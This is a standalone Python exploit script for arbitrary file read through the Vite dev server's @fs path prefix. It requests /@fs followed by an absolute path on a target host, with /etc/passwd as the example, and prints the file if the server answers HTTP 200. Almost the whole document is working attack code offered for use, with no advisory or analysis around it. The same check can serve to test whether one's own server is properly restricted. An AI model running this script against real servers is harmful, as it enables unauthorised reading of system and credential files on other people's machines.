#!/usr/bin/env python3
"""
Vite @fs Arbitrary File Read (No Access Control)
Usage: python vite_fs_direct.py http://target:3000 /etc/passwd
"""

import sys
import http.client
from urllib.parse import urlparse

def exploit(target_url, file_path):
    """
    target_url: e.g. http://192.168.1.100:3000
    file_path: absolute path on the server, e.g. /etc/passwd
    """
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 3000

    # 直接使用 @fs 前缀访问文件
    path = f"/@fs{file_path}"

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Request path: {path}")

    try:
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request("GET", path)
        response = conn.getresponse()
        status = response.status
        body = response.read().decode(errors='replace')
        conn.close()

        if status == 200:
            print(f"[+] Success (HTTP {status})")
            print("[+] File content:\n")
            print(body)
        elif status == 403:
            print("[-] Access denied (HTTP 403) – @fs is properly restricted.")
            print(body[:500])
        else:
            print(f"[-] Received HTTP {status}")
            print(body[:500])
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <http://host:port> <absolute_file_path>")
        sys.exit(1)

    target = sys.argv[1]
    path = sys.argv[2]
    exploit(target, path)